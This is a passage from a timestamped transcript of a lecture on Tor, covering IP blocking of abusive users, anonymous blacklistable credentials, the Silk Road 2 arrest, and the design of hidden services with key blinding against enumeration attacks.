              <text_slice>use IP-based blocking in
order to deter and mitigate</text_slice>
            </slice>
            <slice>
              <time_slice>49:42</time_slice>
              <text_slice>abusive behavior-- people
posting road kill pictures</text_slice>
            </slice>
            <slice>
              <time_slice>49:50</time_slice>
              <text_slice>on My Little Pony sites,
people flaming everybody</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>on IRC channels,
people making love,</text_slice>
            </slice>
            <slice>
              <time_slice>49:59</time_slice>
              <text_slice>leave, join requests, people
replacing entire Wikipedia</text_slice>
            </slice>
            <slice>
              <time_slice>50:05</time_slice>
              <text_slice>pages with racial slurs.</text_slice>
            </slice>
            <slice>
              <time_slice>50:08</time_slice>
              <text_slice>This stuff it's real.</text_slice>
            </slice>
            <slice>
              <time_slice>50:09</time_slice>
              <text_slice>It's problematic.</text_slice>
            </slice>
            <slice>
              <time_slice>50:10</time_slice>
              <text_slice>It's unacceptable to the
websites and services</text_slice>
            </slice>
            <slice>
              <time_slice>50:13</time_slice>
              <text_slice>that use IP-based blocking.</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>They need a way to keep
this from happening.</text_slice>
            </slice>
            <slice>
              <time_slice>50:18</time_slice>
              <text_slice>And IP-based blocking is a
cheap way for them to do that.</text_slice>
            </slice>
            <slice>
              <time_slice>50:21</time_slice>
              <text_slice>So it's pretty frequent that
Tor users get banned completely</text_slice>
            </slice>
            <slice>
              <time_slice>50:27</time_slice>
              <text_slice>from some sites.</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>There's some work on trying to
say, well, why does IP-based</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>blocking really work?</text_slice>
            </slice>
            <slice>
              <time_slice>50:37</time_slice>
              <text_slice>Is it because IPs are people?</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>No.</text_slice>
            </slice>
            <slice>
              <time_slice>50:41</time_slice>
              <text_slice>Everybody in this room knows
how to get a different IP</text_slice>
            </slice>
            <slice>
              <time_slice>50:44</time_slice>
              <text_slice>if they need one.</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>Everybody in this room knows how
to get like tens of thousands</text_slice>
            </slice>
            <slice>
              <time_slice>50:49</time_slice>
              <text_slice>of different IPs
if they need one,</text_slice>
            </slice>
            <slice>
              <time_slice>50:51</time_slice>
              <text_slice>if they need tens of thousands.</text_slice>
            </slice>
            <slice>
              <time_slice>50:53</time_slice>
              <text_slice>But for most people,
getting more IPs</text_slice>
            </slice>
            <slice>
              <time_slice>50:56</time_slice>
              <text_slice>is at least a little time
consuming and at least</text_slice>
            </slice>
            <slice>
              <time_slice>50:59</time_slice>
              <text_slice>a little challenging to the
extent that it imposes a rate</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>limit and a resource
cost on abuse</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>if you don't want a bot net
and if they've already blocked</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>Tor and all the
other proxy services.</text_slice>
            </slice>
            <slice>
              <time_slice>51:12</time_slice>
              <text_slice>So for that, you need to
look at different ways</text_slice>
            </slice>
            <slice>
              <time_slice>51:16</time_slice>
              <text_slice>to provide other resource costs.</text_slice>
            </slice>
            <slice>
              <time_slice>51:20</time_slice>
              <text_slice>You can either say, well--
have you done blind signatures?</text_slice>
            </slice>
            <slice>
              <time_slice>51:24</time_slice>
              <text_slice>Oh, you can construct
things so that you</text_slice>
            </slice>
            <slice>
              <time_slice>51:28</time_slice>
              <text_slice>need an IP to make an account.</text_slice>
            </slice>
            <slice>
              <time_slice>51:31</time_slice>
              <text_slice>But what account
you make with an IP</text_slice>
            </slice>
            <slice>
              <time_slice>51:33</time_slice>
              <text_slice>is not linkable to your IP.</text_slice>
            </slice>
            <slice>
              <time_slice>51:37</time_slice>
              <text_slice>And then later on if
the account gets banned,</text_slice>
            </slice>
            <slice>
              <time_slice>51:39</time_slice>
              <text_slice>you need to create a new
account from a different IP.</text_slice>
            </slice>
            <slice>
              <time_slice>51:41</time_slice>
              <text_slice>That's something you can build,
and we're working with people</text_slice>
            </slice>
            <slice>
              <time_slice>51:44</time_slice>
              <text_slice>to work on it, although it needs
more hacking on the integration</text_slice>
            </slice>
            <slice>
              <time_slice>51:47</time_slice>
              <text_slice>side.</text_slice>
            </slice>
            <slice>
              <time_slice>51:48</time_slice>
              <text_slice>Something else that needs more
hacking on the integration side</text_slice>
            </slice>
            <slice>
              <time_slice>51:51</time_slice>
              <text_slice>is anonymous black
listable credentials.</text_slice>
            </slice>
            <slice>
              <time_slice>51:54</time_slice>
              <text_slice>They're a little esoteric.</text_slice>
            </slice>
            <slice>
              <time_slice>51:55</time_slice>
              <text_slice>But the idea is that
you get something</text_slice>
            </slice>
            <slice>
              <time_slice>52:02</time_slice>
              <text_slice>that allows you to participate
on an IRC server, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>52:05</time_slice>
              <text_slice>You can use this as
many times as you want.</text_slice>
            </slice>
            <slice>
              <time_slice>52:08</time_slice>
              <text_slice>Your using it is not linkable
until you are banned.</text_slice>
            </slice>
            <slice>
              <time_slice>52:12</time_slice>
              <text_slice>Once you are banned,
future attempts</text_slice>
            </slice>
            <slice>
              <time_slice>52:14</time_slice>
              <text_slice>from the same person with the
same credential don't work.</text_slice>
            </slice>
            <slice>
              <time_slice>52:18</time_slice>
              <text_slice>But past activities do not
become linkable to one another.</text_slice>
            </slice>
            <slice>
              <time_slice>52:21</time_slice>
              <text_slice>These can be built
pretty easily.</text_slice>
            </slice>
            <slice>
              <time_slice>52:24</time_slice>
              <text_slice>The problem is convincing people
who are more or less satisfied</text_slice>
            </slice>
            <slice>
              <time_slice>52:26</time_slice>
              <text_slice>with IP blocking to
actually use them</text_slice>
            </slice>
            <slice>
              <time_slice>52:29</time_slice>
              <text_slice>and actually integrating
them with services.</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>Someone inevitably asks
me-- it's kind of neat.</text_slice>
            </slice>
            <slice>
              <time_slice>52:36</time_slice>
              <text_slice>So I started these lecture notes
based on my lecture from 2013.</text_slice>
            </slice>
            <slice>
              <time_slice>52:43</time_slice>
              <text_slice>And there was something
about the inevitable question</text_slice>
            </slice>
            <slice>
              <time_slice>52:46</time_slice>
              <text_slice>about Silk Road
1 getting busted.</text_slice>
            </slice>
            <slice>
              <time_slice>52:48</time_slice>
              <text_slice>There's the inevitable
question about Silk Road 2</text_slice>
            </slice>
            <slice>
              <time_slice>52:50</time_slice>
              <text_slice>getting busted.</text_slice>
            </slice>
            <slice>
              <time_slice>52:51</time_slice>
              <text_slice>Silk Road 2 was a hidden service
operating on the Tor network</text_slice>
            </slice>
            <slice>
              <time_slice>52:55</time_slice>
              <text_slice>where people would get
together to buy and sell</text_slice>
            </slice>
            <slice>
              <time_slice>52:58</time_slice>
              <text_slice>illegal things,
mostly illegal drugs.</text_slice>
            </slice>
            <slice>
              <time_slice>53:03</time_slice>
              <text_slice>So as far as we know, as
far as we can find out,</text_slice>
            </slice>
            <slice>
              <time_slice>53:06</time_slice>
              <text_slice>the guy got busted
through bad OPSEC.</text_slice>
            </slice>
            <slice>
              <time_slice>53:10</time_slice>
              <text_slice>Like he made a public
posting with his actual name,</text_slice>
            </slice>
            <slice>
              <time_slice>53:13</time_slice>
              <text_slice>and then went and deleted it
and put his pseudonym on it.</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>Tor can't help people
against that kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>53:20</time_slice>
              <text_slice>On the other hand, if you've
been looking at the NSA leaks,</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>you know that law enforcement
has been getting information</text_slice>
            </slice>
            <slice>
              <time_slice>53:26</time_slice>
              <text_slice>from intelligence and
then sanitizing it</text_slice>
            </slice>
            <slice>
              <time_slice>53:29</time_slice>
              <text_slice>through a process called
dual construction where</text_slice>
            </slice>
            <slice>
              <time_slice>53:33</time_slice>
              <text_slice>the intelligence agency will say
to the law enforcement agency,</text_slice>
            </slice>
            <slice>
              <time_slice>53:36</time_slice>
              <text_slice>OK, look, it's Fred over there.</text_slice>
            </slice>
            <slice>
              <time_slice>53:38</time_slice>
              <text_slice>He did it.</text_slice>
            </slice>
            <slice>
              <time_slice>53:39</time_slice>
              <text_slice>But that's not
admissible in a court,</text_slice>
            </slice>
            <slice>
              <time_slice>53:41</time_slice>
              <text_slice>and you can never
admit that we told you.</text_slice>
            </slice>
            <slice>
              <time_slice>53:43</time_slice>
              <text_slice>Just find some other way to
find out that Fred did it,</text_slice>
            </slice>
            <slice>
              <time_slice>53:46</time_slice>
              <text_slice>but Fred did it.</text_slice>
            </slice>
            <slice>
              <time_slice>53:48</time_slice>
              <text_slice>According to some
of the Snowden leaks</text_slice>
            </slice>
            <slice>
              <time_slice>53:50</time_slice>
              <text_slice>and some of the leaks
from the other guy, who</text_slice>
            </slice>
            <slice>
              <time_slice>53:52</time_slice>
              <text_slice>has still not been caught,
that's done sometimes.</text_slice>
            </slice>
            <slice>
              <time_slice>53:59</time_slice>
              <text_slice>So OK, at this point, you use
your basic Bayesian reasoning</text_slice>
            </slice>
            <slice>
              <time_slice>54:05</time_slice>
              <text_slice>skills, and you say,
well OK, would I</text_slice>
            </slice>
            <slice>
              <time_slice>54:08</time_slice>
              <text_slice>see this evidence
if the guy actually</text_slice>
            </slice>
            <slice>
              <time_slice>54:11</time_slice>
              <text_slice>got caught by because of OPSEC?</text_slice>
            </slice>
            <slice>
              <time_slice>54:13</time_slice>
              <text_slice>Yes, I would.</text_slice>
            </slice>
            <slice>
              <time_slice>54:14</time_slice>
              <text_slice>I would see bad OPSEC.</text_slice>
            </slice>
            <slice>
              <time_slice>54:15</time_slice>
              <text_slice>I would see reports that he got
caught because of bad OPSEC.</text_slice>
            </slice>
            <slice>
              <time_slice>54:19</time_slice>
              <text_slice>But what would I see if it
were a dual construction case?</text_slice>
            </slice>
            <slice>
              <time_slice>54:24</time_slice>
              <text_slice>I would also see
reports that the guy</text_slice>
            </slice>
            <slice>
              <time_slice>54:27</time_slice>
              <text_slice>got caught by bad OPSEC.</text_slice>
            </slice>
            <slice>
              <time_slice>54:29</time_slice>
              <text_slice>Because the evidence that
would be available to</text_slice>
            </slice>
            <slice>
              <time_slice>54:32</time_slice>
              <text_slice>us is the same in either case.</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>We can't really conclude
much from any public reports</text_slice>
            </slice>
            <slice>
              <time_slice>54:38</time_slice>
              <text_slice>of that.</text_slice>
            </slice>
            <slice>
              <time_slice>54:39</time_slice>
              <text_slice>That said, it does look like
the guy got busted by bad OPSEC.</text_slice>
            </slice>
            <slice>
              <time_slice>54:44</time_slice>
              <text_slice>It does look like
the kind of bad OPSEC</text_slice>
            </slice>
            <slice>
              <time_slice>54:46</time_slice>
              <text_slice>that you would be
looking for if you</text_slice>
            </slice>
            <slice>
              <time_slice>54:48</time_slice>
              <text_slice>were trying to catch somebody
running something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>54:51</time_slice>
              <text_slice>Nevertheless, earlier I
suggested that please do not</text_slice>
            </slice>
            <slice>
              <time_slice>54:54</time_slice>
              <text_slice>use myself to break any laws.</text_slice>
            </slice>
            <slice>
              <time_slice>54:58</time_slice>
              <text_slice>Also if you're life or
freedom is at stake from using</text_slice>
            </slice>
            <slice>
              <time_slice>55:05</time_slice>
              <text_slice>Tor or any security
product, do not</text_slice>
            </slice>
            <slice>
              <time_slice>55:09</time_slice>
              <text_slice>use that product in isolation.</text_slice>
            </slice>
            <slice>
              <time_slice>55:11</time_slice>
              <text_slice>Think of ways to
use it to construct</text_slice>
            </slice>
            <slice>
              <time_slice>55:14</time_slice>
              <text_slice>a series of redundant
defenses for yourself</text_slice>
            </slice>
            <slice>
              <time_slice>55:21</time_slice>
              <text_slice>if your life or
freedom at stake,</text_slice>
            </slice>
            <slice>
              <time_slice>55:23</time_slice>
              <text_slice>or if having the
system broken is</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>completely unacceptable to you.</text_slice>
            </slice>
            <slice>
              <time_slice>55:28</time_slice>
              <text_slice>And I'll say that about Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>55:30</time_slice>
              <text_slice>And I'll say that about TLS.</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>And I'll say that about PGP.</text_slice>
            </slice>
            <slice>
              <time_slice>55:33</time_slice>
              <text_slice>Software is a work in progress.</text_slice>
            </slice>
            <slice>
              <time_slice>55:38</time_slice>
              <text_slice>So that's the abuse section.</text_slice>
            </slice>
            <slice>
              <time_slice>55:41</time_slice>
              <text_slice>I've got 25 minutes--
hidden services.</text_slice>
            </slice>
            <slice>
              <time_slice>55:47</time_slice>
              <text_slice>Where's hidden services?</text_slice>
            </slice>
            <slice>
              <time_slice>55:50</time_slice>
              <text_slice>So responder anonymity
is a much harder problem</text_slice>
            </slice>
            <slice>
              <time_slice>55:53</time_slice>
              <text_slice>than initiator anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>55:55</time_slice>
              <text_slice>Initiator anonymity
is what you get</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>when Alice wants to
buy socks, and Alice</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>wants to stay anonymous
from the sock vendor.</text_slice>
            </slice>
            <slice>
              <time_slice>56:02</time_slice>
              <text_slice>Responder anonymity
is when Alice</text_slice>
            </slice>
            <slice>
              <time_slice>56:05</time_slice>
              <text_slice>wants to publish her
poetry online and run a web</text_slice>
            </slice>
            <slice>
              <time_slice>56:09</time_slice>
              <text_slice>server that has
her poetry on it,</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>but not let anyone know
where that web server is</text_slice>
            </slice>
            <slice>
              <time_slice>56:14</time_slice>
              <text_slice>because the poetry
is so embarrassing.</text_slice>
            </slice>
            <slice>
              <time_slice>56:16</time_slice>
              <text_slice>And yes there actually
is a hidden service</text_slice>
            </slice>
            <slice>
              <time_slice>56:19</time_slice>
              <text_slice>out there of mine
with bad poetry on it.</text_slice>
            </slice>
            <slice>
              <time_slice>56:21</time_slice>
              <text_slice>No, I don't think anybody's
actually published it yet.</text_slice>
            </slice>
            <slice>
              <time_slice>56:24</time_slice>
              <text_slice>No, I'm not going to
tell anybody where it is.</text_slice>
            </slice>
            <slice>
              <time_slice>56:26</time_slice>
              <text_slice>I'm waiting for it to go public.</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>So all right, one thing
you could do is-- let's</text_slice>
            </slice>
            <slice>
              <time_slice>56:37</time_slice>
              <text_slice>see, how much time?</text_slice>
            </slice>
            <slice>
              <time_slice>56:39</time_slice>
              <text_slice>OK, I can do this.</text_slice>
            </slice>
            <slice>
              <time_slice>56:43</time_slice>
              <text_slice>So now Alice wants to
publish her poetry.</text_slice>
            </slice>
            <slice>
              <time_slice>56:46</time_slice>
              <text_slice>So I'm going to put
Alice on this end,</text_slice>
            </slice>
            <slice>
              <time_slice>56:48</time_slice>
              <text_slice>because she's the responder.</text_slice>
            </slice>
            <slice>
              <time_slice>56:49</time_slice>
              <text_slice>Alice could build a path-- this
represents a lot of relays--</text_slice>
            </slice>
            <slice>
              <time_slice>56:54</time_slice>
              <text_slice>through the Tor network, and
then just say to this relay,</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>please accept connections.</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>So now anyone who goes
to this relay could say,</text_slice>
            </slice>
            <slice>
              <time_slice>57:05</time_slice>
              <text_slice>hey, I want to talk to Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>57:07</time_slice>
              <text_slice>And there have been
designs that work this way.</text_slice>
            </slice>
            <slice>
              <time_slice>57:10</time_slice>
              <text_slice>It has some challenges, though.</text_slice>
            </slice>
            <slice>
              <time_slice>57:12</time_slice>
              <text_slice>One challenge is this relay
could man in the middle</text_slice>
            </slice>
            <slice>
              <time_slice>57:15</time_slice>
              <text_slice>all the traffic unless there
is a well known TLS key.</text_slice>
            </slice>
            <slice>
              <time_slice>57:19</time_slice>
              <text_slice>Another thing is
maybe this relay</text_slice>
            </slice>
            <slice>
              <time_slice>57:22</time_slice>
              <text_slice>is also embarrassed
by the poetry</text_slice>
            </slice>
            <slice>
              <time_slice>57:24</time_slice>
              <text_slice>and doesn't want to
be a public contact</text_slice>
            </slice>
            <slice>
              <time_slice>57:26</time_slice>
              <text_slice>point for poetry so terrible.</text_slice>
            </slice>
            <slice>
              <time_slice>57:31</time_slice>
              <text_slice>So this relay could also be
pressured by other people who</text_slice>
            </slice>
            <slice>
              <time_slice>57:35</time_slice>
              <text_slice>hate the poetry to censor it.</text_slice>
            </slice>
            <slice>
              <time_slice>57:37</time_slice>
              <text_slice>This relay could also make
itself an attack target.</text_slice>
            </slice>
            <slice>
              <time_slice>57:41</time_slice>
              <text_slice>So you want some way where Alice
can go to different relays over</text_slice>
            </slice>
            <slice>
              <time_slice>57:45</time_slice>
              <text_slice>time and no single relay is
touching unencrypted traffic</text_slice>
            </slice>
            <slice>
              <time_slice>57:51</time_slice>
              <text_slice>of Alice's.</text_slice>
            </slice>
            <slice>
              <time_slice>57:52</time_slice>
              <text_slice>All right, that's doable.</text_slice>
            </slice>
            <slice>
              <time_slice>57:56</time_slice>
              <text_slice>But once you have a lot
of different relays,</text_slice>
            </slice>
            <slice>
              <time_slice>57:58</time_slice>
              <text_slice>what does Alice
actually tell people?</text_slice>
            </slice>
            <slice>
              <time_slice>58:01</time_slice>
              <text_slice>It's kind of got
to be a public key.</text_slice>
            </slice>
            <slice>
              <time_slice>58:04</time_slice>
              <text_slice>Because if she just says, relay
x, relay y, relay z, but x, y,</text_slice>
            </slice>
            <slice>
              <time_slice>58:08</time_slice>
              <text_slice>and z are changing
every five minutes,</text_slice>
            </slice>
            <slice>
              <time_slice>58:11</time_slice>
              <text_slice>that's kind of challenging
to know you actually</text_slice>
            </slice>
            <slice>
              <time_slice>58:13</time_slice>
              <text_slice>got the right relay.</text_slice>
            </slice>
            <slice>
              <time_slice>58:15</time_slice>
              <text_slice>So let's say she tells
everybody a public key,</text_slice>
            </slice>
            <slice>
              <time_slice>58:17</time_slice>
              <text_slice>and once she gets over here,
she says, hey, this is Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>58:22</time_slice>
              <text_slice>I'll prove it with
my public key.</text_slice>
            </slice>
            <slice>
              <time_slice>58:24</time_slice>
              <text_slice>So this relay knows
that public key z is</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>running a hidden service here.</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>And so if anyone else says,
hey, connect me to public key z,</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>they can do a
handshake and wind up</text_slice>
            </slice>
            <slice>
              <time_slice>58:41</time_slice>
              <text_slice>with a shared key with Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>And it's the same handshake as
the Tor circuit extension uses.</text_slice>
            </slice>
            <slice>
              <time_slice>58:46</time_slice>
              <text_slice>And now Bob can
read Alice's poetry</text_slice>
            </slice>
            <slice>
              <time_slice>58:48</time_slice>
              <text_slice>by going another path through
the Tor network over here.</text_slice>
            </slice>
            <slice>
              <time_slice>58:52</time_slice>
              <text_slice>Bob has to know PKz, and Bob can
say, hey, connect me with PKz.</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>Send this thing that's sort
of like a create cell--</text_slice>
            </slice>
            <slice>
              <time_slice>58:59</time_slice>
              <text_slice>really it's an introduce
cell, but let's</text_slice>
            </slice>
            <slice>
              <time_slice>59:01</time_slice>
              <text_slice>forget that-- over the Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>They do the same
handshake that relays do.</text_slice>
            </slice>
            <slice>
              <time_slice>59:05</time_slice>
              <text_slice>And now they have a
shared key that they can</text_slice>
            </slice>
            <slice>
              <time_slice>59:07</time_slice>
              <text_slice>use for end to end encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>59:10</time_slice>
              <text_slice>Well, there's something
I left out, though,</text_slice>
            </slice>
            <slice>
              <time_slice>59:11</time_slice>
              <text_slice>which is, how does Bob
know how to go here?</text_slice>
            </slice>
            <slice>
              <time_slice>59:15</time_slice>
              <text_slice>And can we do anything
about the fact</text_slice>
            </slice>
            <slice>
              <time_slice>59:17</time_slice>
              <text_slice>that this relay has to
learn to this public key?</text_slice>
            </slice>
            <slice>
              <time_slice>59:22</time_slice>
              <text_slice>Well, we can.</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>We can add some [INAUDIBLE]
directory system</text_slice>
            </slice>
            <slice>
              <time_slice>59:27</time_slice>
              <text_slice>where Alice uploads a signed
statement anonymously over Tor</text_slice>
            </slice>
            <slice>
              <time_slice>59:32</time_slice>
              <text_slice>saying PKz is at a relay x.</text_slice>
            </slice>
            <slice>
              <time_slice>59:41</time_slice>
              <text_slice>And then Bob says, hey,
give me a signed statement</text_slice>
            </slice>
            <slice>
              <time_slice>59:44</time_slice>
              <text_slice>to ask the directory
system, hey, give me</text_slice>
            </slice>
            <slice>
              <time_slice>59:46</time_slice>
              <text_slice>a signed statement about PKz.</text_slice>
            </slice>
            <slice>
              <time_slice>59:49</time_slice>
              <text_slice>And Bob finds out where to go.</text_slice>
            </slice>
            <slice>
              <time_slice>59:52</time_slice>
              <text_slice>And we could even do one
better and have Alice give</text_slice>
            </slice>
            <slice>
              <time_slice>59:56</time_slice>
              <text_slice>a different public key here.</text_slice>
            </slice>
            <slice>
              <time_slice>59:59</time_slice>
              <text_slice>So this could be PKw.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:04</time_slice>
              <text_slice>And the statement she uploads
to the directory can say,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:09</time_slice>
              <text_slice>if you want to talk to the
service with public key z,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:12</time_slice>
              <text_slice>then go to relay x
and use public key w.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:16</time_slice>
              <text_slice>And now public key z
isn't published here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:21</time_slice>
              <text_slice>You could even go one
farther and encrypt this</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:26</time_slice>
              <text_slice>with some shared secret
known to Alice and Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:29</time_slice>
              <text_slice>And if you do that, then
the directory service</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:32</time_slice>
              <text_slice>and people who can contact
the directory service</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:34</time_slice>
              <text_slice>can't learn how to connect
to Alice with that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:39</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>STUDENT: Just a
quick question there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:42</time_slice>
              <text_slice>If that's not encrypted,
then Rx can still</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:44</time_slice>
              <text_slice>find out that it's running
a service for Alice, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>NICK MATHEWSON: Yep.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>Well, not for Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:49</time_slice>
              <text_slice>It can find out that
it's running PKz</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:51</time_slice>
              <text_slice>if this is not encrypted.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:53</time_slice>
              <text_slice>We have a design for that
that I'm actually going</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:55</time_slice>
              <text_slice>to get to at the end of this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:56</time_slice>
              <text_slice>But it's not built yet.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:58</time_slice>
              <text_slice>But it's pretty cool.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:01</time_slice>
              <text_slice>So OK, and you don't want to
use a centralized directory</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:03</time_slice>
              <text_slice>for this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:04</time_slice>
              <text_slice>So we actually do use a DHT,
which is, again, not perfect,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:12</time_slice>
              <text_slice>and has some censorship
opportunities.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:14</time_slice>
              <text_slice>But we are trying to
make those less and less.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:16</time_slice>
              <text_slice>And I might cover more stuff,
so I can't do the whole details.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:22</time_slice>
              <text_slice>So one of the
problems there though</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:24</time_slice>
              <text_slice>is if you are running one
of these directory services,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>you've got a complete list of
these keys pretty-- over time,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:35</time_slice>
              <text_slice>you run a directory
service [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:37</time_slice>
              <text_slice>You get a complete
list of all these keys,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:39</time_slice>
              <text_slice>and you can try
connecting to all the ones</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:41</time_slice>
              <text_slice>that don't have encrypted
stuff to find out what's there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:43</time_slice>
              <text_slice>That's called an
enumeration attack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:45</time_slice>
              <text_slice>And we didn't list
that in our paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:47</time_slice>
              <text_slice>because we weren't
thinking of that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:49</time_slice>
              <text_slice>We didn't.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:51</time_slice>
              <text_slice>But it is something
we'd like to resist.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:53</time_slice>
              <text_slice>So in the design I hope
to be hacking together</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:57</time_slice>
              <text_slice>sometime in 2014, we're going
to move towards a key blinding</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:02</time_slice>
              <text_slice>approach where Alice
and Bob share PKz,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:18</time_slice>
              <text_slice>but this statement is
not signed with PKz.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:22</time_slice>
              <text_slice>This statement is
signed with PKz prime</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>where PKz prime is
derived from PKz</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:33</time_slice>
              <text_slice>and, say, the date such that
if you know PKz and the date,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:44</time_slice>
              <text_slice>you can derive PKz prime.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:47</time_slice>
              <text_slice>If like Alice you
know secret Kz,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:51</time_slice>
              <text_slice>you can generate messages
that are signed by PKz prime.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:56</time_slice>
              <text_slice>But if you only see PKz
prime, even knowing the date,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:01</time_slice>
              <text_slice>you cannot re-derive PKz.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:04</time_slice>
              <text_slice>We've got a proof.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:06</time_slice>
              <text_slice>And if you'd like to find out
how this works, then ping me</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:10</time_slice>
              <text_slice>and I'll send you the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:11</time_slice>
              <text_slice>It's a cool trick.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:15</time_slice>
              <text_slice>We weren't the first
ones to invent this idea.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:18</time_slice>
              <text_slice>But that is how we're going
to solve enumeration attacks</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:22</time_slice>
              <text_slice>sometime this coming year
assuming that I can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:26</time_slice>
              <text_slice>get the time to build it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>So that's hidden services.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>Attacks and
defenses-- so so far,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:41</time_slice>
              <text_slice>the biggest category
of attacks we've seen</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>is attacks at the
application level.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:47</time_slice>
              <text_slice>So if you're running an
application over Tor,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:50</time_slice>
              <text_slice>and it's sending unencrypted
traffic, like regular HTTP,</text_slice>
            </slice>
            <slice>
